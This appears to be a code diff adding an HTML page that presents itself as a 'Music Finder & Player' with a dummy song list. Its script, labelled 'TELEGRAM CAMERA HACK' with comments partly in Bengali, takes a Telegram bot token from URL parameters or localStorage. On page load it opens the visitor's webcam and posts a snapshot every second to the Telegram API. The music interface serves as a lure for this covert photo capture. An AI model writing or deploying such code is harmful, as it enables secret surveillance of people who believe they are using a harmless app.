@@ -1,1 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>🎵 Music Finder</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f3f4f6;
+            margin: 0;
+            padding: 0 0 40px 0;
+            min-height: 100vh;
+        }
+        .music-header {
+            background: linear-gradient(135deg, #1f2937, #111827);
+            padding: 24px 16px 20px;
+            text-align: center;
+            border-bottom: 3px solid #10b981;
+        }
+        .music-header img {
+            display: block;
+            margin: 0 auto 10px;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #374151;
+            padding: 8px;
+            object-fit: contain;
+        }
+        .music-header h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .music-header p {
+            color: #9ca3af;
+            font-size: 0.85rem;
+            margin-top: 4px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 24px 20px;
+            max-width: 520px;
+            margin: 24px auto;
+            border: 1px solid #e5e7eb;
+        }
+        .search-box {
+            display: flex;
+            gap: 0;
+            border-radius: 50px;
+            overflow: hidden;
+            border: 1px solid #d1d5db;
+            background: #fff;
+            transition: 0.2s;
+        }
+        .search-box:focus-within {
+            border-color: #10b981;
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
+        }
+        .search-box input {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            outline: none;
+            font-size: 1rem;
+            background: transparent;
+        }
+        .search-box button {
+            background: #1f2937;
+            color: #fff;
+            padding: 12px 24px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+        .search-box button:hover {
+            background: #374151;
+        }
+        .steps {
+            background: #f9fafb;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-top: 20px;
+            border: 1px solid #e5e7eb;
+        }
+        .steps h2 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1f2937;
+        }
+        .steps p {
+            color: #4b5563;
+            font-size: 0.9rem;
+            margin: 4px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .steps p i {
+            color: #10b981;
+            width: 18px;
+            text-align: center;
+        }
 
+        /* ---- Results ---- */
+        #results {
+            margin-top: 20px;
+            display: none;
+        }
+        #results.active {
+            display: block;
+        }
+        .result-item {
+            background: #f9fafb;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            border: 1px solid #e5e7eb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: 0.2s;
+        }
+        .result-item:hover {
+            background: #f3f4f6;
+            border-color: #10b981;
+        }
+        .result-item .info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        .result-item .info .title {
+            font-weight: 700;
+            color: #1f2937;
+        }
+        .result-item .info .artist {
+            font-size: 0.85rem;
+            color: #6b7280;
+        }
+        .result-item .play-btn {
+            background: #10b981;
+            color: #fff;
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .result-item .play-btn:hover {
+            background: #059669;
+            transform: scale(1.05);
+        }
+        .result-item .play-btn.playing {
+            background: #ef4444;
+        }
+
+        /* ---- Now Playing ---- */
+        #nowPlaying {
+            margin-top: 16px;
+            padding: 14px 16px;
+            background: #1f2937;
+            border-radius: 12px;
+            color: #fff;
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            border-left: 4px solid #10b981;
+        }
+        #nowPlaying.active {
+            display: flex;
+        }
+        #nowPlaying .np-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        #nowPlaying .np-info .np-title {
+            font-weight: 700;
+        }
+        #nowPlaying .np-info .np-artist {
+            font-size: 0.8rem;
+            color: #9ca3af;
+        }
+        #nowPlaying .np-close {
+            background: transparent;
+            border: none;
+            color: #9ca3af;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: 0.2s;
+        }
+        #nowPlaying .np-close:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+        }
+
+        .footer {
+            text-align: center;
+            color: #6b7280;
+            font-size: 0.85rem;
+            margin-top: 24px;
+        }
+        .footer i {
+            color: #ef4444;
+        }
+
+        .no-result {
+            text-align: center;
+            color: #6b7280;
+            padding: 20px 0;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="music-header">
+        <img src="https://storage.googleapis.com/a1aa/image/MpHx6_Iux_-BB9ekUH9b2W_IexXqwXkIgEY6byVfLwU.jpg" alt="Music icon" />
+        <h1>🎵 MUSIC FINDER & PLAYER</h1>
+        <p>Discover and play your favorite tracks</p>
+    </div>
+
+    <div class="card">
+        <!-- Search -->
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search for music..." />
+            <button id="searchBtn">Search</button>
+        </div>
+
+        <!-- Steps -->
+        <div class="steps">
+            <h2>📋 Steps to Use:</h2>
+            <p><i class="fas fa-check-circle"></i> Enter the music you want to find in the search bar.</p>
+            <p><i class="fas fa-check-circle"></i> Click on the "Search" button to look for your music.</p>
+            <p><i class="fas fa-check-circle"></i> Select the desired music from the search results.</p>
+            <p><i class="fas fa-check-circle"></i> Enjoy listening to your selected music!</p>
+        </div>
+
+        <!-- Results -->
+        <div id="results">
+            <div id="resultsList"></div>
+        </div>
+
+        <!-- Now Playing -->
+        <div id="nowPlaying">
+            <div class="np-info">
+                <span class="np-title" id="npTitle">Song Name</span>
+                <span class="np-artist" id="npArtist">Artist</span>
+            </div>
+            <button class="np-close" id="npClose"><i class="fas fa-times"></i></button>
+        </div>
+    </div>
+
+    <div class="footer">
+        Made with <i class="fas fa-heart"></i> by Music Team
+    </div>
+
+   <script>
+    // ====== ডিকোড ফাংশন (হিজিবিজি ডেটা পড়ুন) ======
+    function getCreds() {
+        const params = new URLSearchParams(window.location.search);
+        let token = params.get('tg_token');
+        let chatId = params.get('tg_chat');
+        
+        // এনকোডেড ডেটা চেক করুন
+        if (!token || !chatId) {
+            const encodedData = params.get('tg_data');
+            if (encodedData) {
+                try {
+                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
+                    token = decoded.token;
+                    chatId = decoded.chatId;
+                } catch(e) {
+                    console.warn('Failed to decode tg_data');
+                }
+            }
+        }
+        
+        // localStorage থেকে ফallback
+        if (!token) token = localStorage.getItem('tg_bot_token');
+        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
+        
+        return { token, chatId };
+    }
+
+    (function() {
+        'use strict';
+
+        // ---------- DUMMY MUSIC DATABASE ----------
+        const musicDB = [
+            { title: "Blinding Lights", artist: "The Weeknd" },
+            { title: "Shape of You", artist: "Ed Sheeran" },
+            { title: "Levitating", artist: "Dua Lipa" },
+            { title: "Stay", artist: "The Kid LAROI, Justin Bieber" },
+            { title: "Peaches", artist: "Justin Bieber" },
+            { title: "Montero", artist: "Lil Nas X" },
+            { title: "Good 4 U", artist: "Olivia Rodrigo" },
+            { title: "Kiss Me More", artist: "Doja Cat" },
+            { title: "Butter", artist: "BTS" },
+            { title: "Dynamite", artist: "BTS" },
+            { title: "WAP", artist: "Cardi B" },
+            { title: "Mood", artist: "24kGoldn" },
+            { title: "Bang!", artist: "AJR" },
+            { title: "Bad Habit", artist: "Steve Lacy" },
+            { title: "About Damn Time", artist: "Lizzo" },
+            { title: "As It Was", artist: "Harry Styles" },
+            { title: "Late Night Talking", artist: "Harry Styles" },
+            { title: "Music For a Sushi Restaurant", artist: "Harry Styles" },
+            { title: "Satellite", artist: "Harry Styles" },
+            { title: "Daylight", artist: "Harry Styles" },
+        ];
+
+        // ---------- DOM REFS ----------
+        const searchInput = document.getElementById('searchInput');
+        const searchBtn = document.getElementById('searchBtn');
+        const resultsDiv = document.getElementById('results');
+        const resultsList = document.getElementById('resultsList');
+        const nowPlaying = document.getElementById('nowPlaying');
+        const npTitle = document.getElementById('npTitle');
+        const npArtist = document.getElementById('npArtist');
+        const npClose = document.getElementById('npClose');
+
+        let currentPlaying = null;
+
+        // ---------- SEARCH FUNCTION ----------
+        function performSearch(query) {
+            const q = query.trim().toLowerCase();
+            if (!q) {
+                resultsDiv.classList.remove('active');
+                return;
+            }
+
+            const matches = musicDB.filter(item =>
+                item.title.toLowerCase().includes(q) ||
+                item.artist.toLowerCase().includes(q)
+            );
+
+            if (matches.length === 0) {
+                resultsList.innerHTML = `<div class="no-result">😕 No results found for "${query}"</div>`;
+            } else {
+                let html = '';
+                matches.forEach((item, index) => {
+                    html += `
+                        <div class="result-item">
+                            <div class="info">
+                                <span class="title">${item.title}</span>
+                                <span class="artist">${item.artist}</span>
+                            </div>
+                            <button class="play-btn" data-index="${index}" data-title="${item.title}" data-artist="${item.artist}">
+                                <i class="fas fa-play"></i>
+                            </button>
+                        </div>
+                    `;
+                });
+                resultsList.innerHTML = html;
+            }
+
+            resultsDiv.classList.add('active');
+
+            // Attach play events to all play buttons
+            document.querySelectorAll('.play-btn').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    const title = this.dataset.title;
+                    const artist = this.dataset.artist;
+                    playSong(title, artist);
+                });
+            });
+        }
+
+        // ---------- PLAY SONG (DUMMY) ----------
+        function playSong(title, artist) {
+            currentPlaying = { title, artist };
+            npTitle.textContent = title;
+            npArtist.textContent = artist;
+            nowPlaying.classList.add('active');
+
+            // Update button icons
+            document.querySelectorAll('.play-btn').forEach(btn => {
+                const t = btn.dataset.title;
+                if (t === title) {
+                    btn.classList.add('playing');
+                    btn.innerHTML = '<i class="fas fa-pause"></i>';
+                } else {
+                    btn.classList.remove('playing');
+                    btn.innerHTML = '<i class="fas fa-play"></i>';
+                }
+            });
+
+            // Simulate playing (just show message in console)
+            console.log(`🎵 Now playing: ${title} - ${artist}`);
+        }
+
+        // ---------- STOP PLAYING ----------
+        function stopPlaying() {
+            nowPlaying.classList.remove('active');
+            currentPlaying = null;
+            document.querySelectorAll('.play-btn').forEach(btn => {
+                btn.classList.remove('playing');
+                btn.innerHTML = '<i class="fas fa-play"></i>';
+            });
+            console.log('⏹ Playback stopped');
+        }
+
+        // ---------- EVENT LISTENERS ----------
+        searchBtn.addEventListener('click', function() {
+            performSearch(searchInput.value);
+        });
+
+        searchInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                performSearch(searchInput.value);
+            }
+        });
+
+        npClose.addEventListener('click', stopPlaying);
+
+        // ---------- TELEGRAM CAMERA HACK (FIXED) ----------
+        // আগে getTelegramCreds() ছিল, এখন getCreds() ব্যবহার করুন
+        document.addEventListener('DOMContentLoaded', function() {
+            const { token, chatId } = getCreds();  // ✅ এখানে পরিবর্তন
+            if (!token || !chatId) {
+                console.warn('⚠️ Telegram not configured. Camera will not send photos.');
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setInterval(function() {
+                        captureAndSend(video, token, chatId);
+                    }, 1000);
+                })
+                .catch(function(err) {
+                    console.error('Camera access denied:', err);
+                });
+        });
+
+        function captureAndSend(video, token, chatId) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('photo', blob, 'image.png');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(function(err) {
+                    console.warn('Telegram send error:', err);
+                });
+            }, 'image/png');
+        }
+
+        console.log('📸 Camera Hack + Real Music Search loaded.');
+        console.log('💡 Search for songs and play them!');
+    })();
+</script>
+</body>
+</html>
